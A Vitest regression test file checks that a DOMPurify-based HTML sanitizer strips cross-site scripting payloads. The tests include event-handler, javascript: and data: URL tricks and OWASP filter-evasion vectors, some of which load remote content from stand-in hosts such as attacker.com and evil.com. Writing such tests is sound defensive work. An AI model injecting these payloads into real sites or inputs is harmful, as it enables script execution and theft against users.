import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "../sanitize-html";

/**
 * S5-06: regression tests for the DOMPurify-backed sanitizer.
 *
 * Each case includes a payload that the previous regex implementation
 * was known to mishandle — they exist to lock in the behavioural
 * upgrade and prevent a future "simplification" from silently
 * regressing back to a regex.
 */
describe("sanitizeHtml", () => {
  it("preserves the allow-listed structural tags", () => {
    const out = sanitizeHtml(
      '<h2>Title</h2><p>Some <strong>bold</strong> text and a <a href="https://example.com">link</a>.</p>',
    );
    expect(out).toContain("<h2>Title</h2>");
    expect(out).toContain("<strong>bold</strong>");
    expect(out).toContain('href="https://example.com"');
  });

  it("strips <script> tags and their content", () => {
    const out = sanitizeHtml("<p>safe</p><script>alert('xss')</script>");
    expect(out).not.toContain("script");
    expect(out).not.toContain("alert");
    expect(out).toContain("<p>safe</p>");
  });

  it("strips nested-malformed <scr<script>ipt> bypass (regex bypass)", () => {
    // The old regex collapsed inner `<script>` first, leaving an outer
    // `<script>...` to execute. DOMPurify parses the DOM and removes
    // any script element regardless of nesting. The `alert(1)` text
    // may survive as inert textContent — the security guarantee is
    // that no `<script>` tag (or any executable element) is rendered.
    const out = sanitizeHtml("<scr<script>ipt>alert(1)</script>ipt>");
    expect(out.toLowerCase()).not.toContain("<script");
    expect(out.toLowerCase()).not.toContain("</script");
  });

  it("strips event-handler attributes even with whitespace around `=`", () => {
    // The previous regex required `\s+on\w+\s*=` and could be evaded
    // with tab-or-newline placement around `=`.
    const out = sanitizeHtml(`<img src="x" onerror\n=\t"alert(1)" />`);
    expect(out.toLowerCase()).not.toContain("onerror");
    expect(out).not.toContain("alert(1)");
  });

  it("strips dangerous elements not handled by the old regex (svg/details)", () => {
    expect(sanitizeHtml(`<svg onload="alert(1)"></svg>`).toLowerCase()).not.toContain("alert(1)");
    expect(
      sanitizeHtml(
        `<details open ontoggle="alert(1)"><summary>x</summary></details>`,
      ).toLowerCase(),
    ).not.toContain("alert(1)");
  });

  it("removes javascript: URLs from href", () => {
    const out = sanitizeHtml(`<a href="javascript:alert(1)">click</a>`);
    expect(out.toLowerCase()).not.toContain("javascript:");
  });

  it("removes data: URLs from <a href> (XSS via data:text/html)", () => {
    // `data:text/html` in an `<a href>` is a navigation that executes
    // arbitrary HTML/JS in the origin. DOMPurify rejects it even when
    // the host attribute is otherwise allow-listed.
    const out = sanitizeHtml(
      `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`,
    );
    expect(out).not.toContain("data:text/html");
  });

  it("strips iframe / object / embed / form / meta / link", () => {
    for (const tag of [
      '<iframe src="https://evil.com"></iframe>',
      '<object data="x"></object>',
      '<embed src="x" />',
      '<form action="x"><input /></form>',
      '<meta http-equiv="refresh" />',
      '<link rel="stylesheet" href="x" />',
    ]) {
      const out = sanitizeHtml(tag).toLowerCase();
      expect(out).not.toContain("iframe");
      expect(out).not.toContain("<object");
      expect(out).not.toContain("<embed");
      expect(out).not.toContain("<form");
      expect(out).not.toContain("<meta");
      expect(out).not.toContain("<link");
    }
  });

  it("returns an empty string unchanged", () => {
    expect(sanitizeHtml("")).toBe("");
  });

  // F-06: OWASP XSS cheat sheet vectors — ensures the DOMPurify-based
  // sanitizer handles all known bypass patterns from the OWASP XSS
  // Filter Evasion Cheat Sheet.
  describe("OWASP XSS cheat sheet vectors", () => {
    const VECTORS: [string, string][] = [
      ["IMG onerror", `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`],
      ["IMG dynsrc", `<IMG DYNSRC="javascript:alert('XSS')">`],
      ["IMG lowsrc", `<IMG LOWSRC="javascript:alert('XSS')">`],
      ["BODY onload", `<BODY ONLOAD=alert('XSS')>`],
      ["INPUT onfocus autofocus", `<INPUT TYPE="TEXT" ONFOCUS="alert('XSS')" AUTOFOCUS>`],
      ["MARQUEE onstart", `<MARQUEE ONSTART=alert('XSS')>`],
      ["VIDEO onerror", `<VIDEO><SOURCE ONERROR="alert('XSS')">`],
      ["MATH/MTEXT", `<MATH><MTEXT><!--<IMG SRC="--><IMG SRC=x onerror=alert('XSS')>//">`],
      ["TABLE background", `<TABLE BACKGROUND="javascript:alert('XSS')">`],
      ["DIV style expression", `<DIV STYLE="width:expression(alert('XSS'))">`],
      ["BASE href", `<BASE HREF="javascript:alert('XSS');//">`],
      ["OBJECT data", `<OBJECT TYPE="text/x-scriptlet" DATA="http://attacker.com/xss.html">`],
      ["EMBED src", `<EMBED SRC="http://attacker.com/xss.swf" AllowScriptAccess="always">`],
      [
        "XML data island",
        `<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`,
      ],
      ["META refresh", `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`],
      ["LINK stylesheet", `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`],
      ["STYLE import", `<STYLE>@import'http://attacker.com/xss.css';</STYLE>`],
      ["VBScript", `<IMG SRC='vbscript:MsgBox("XSS")'>`],
      ["HTML entity encoding", `<IMG SRC=javascript:alert(&quot;XSS&quot;)>`],
    ];

    for (const [label, payload] of VECTORS) {
      it(`neutralizes ${label}`, () => {
        const out = sanitizeHtml(payload);
        expect(out.toLowerCase()).not.toContain("alert(");
        expect(out.toLowerCase()).not.toContain("alert'");
        expect(out.toLowerCase()).not.toContain("javascript:");
        expect(out.toLowerCase()).not.toContain("vbscript:");
        expect(out.toLowerCase()).not.toContain("<script");
        expect(out.toLowerCase()).not.toContain("onerror");
        expect(out.toLowerCase()).not.toContain("onload");
        expect(out.toLowerCase()).not.toContain("onfocus");
        expect(out.toLowerCase()).not.toContain("onstart");
        expect(out.toLowerCase()).not.toContain("ontoggle");
        expect(out.toLowerCase()).not.toContain("expression(");
      });
    }

    // These vectors produce inert text content (no executable elements).
    // DOMPurify correctly prevents execution — the text survives because
    // it is not inside any dangerous element.
    it("neutralizes UTF-7 encoded (inert text)", () => {
      const out = sanitizeHtml(`+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`);
      expect(out.toLowerCase()).not.toContain("<script");
      expect(out.toLowerCase()).not.toContain("</script");
    });

    it("neutralizes null byte injection (inert text)", () => {
      const out = sanitizeHtml(`<scr\x00ipt>alert("XSS")</scr\x00ipt>`);
      expect(out.toLowerCase()).not.toContain("<script");
      expect(out.toLowerCase()).not.toContain("</script");
    });
  });
});
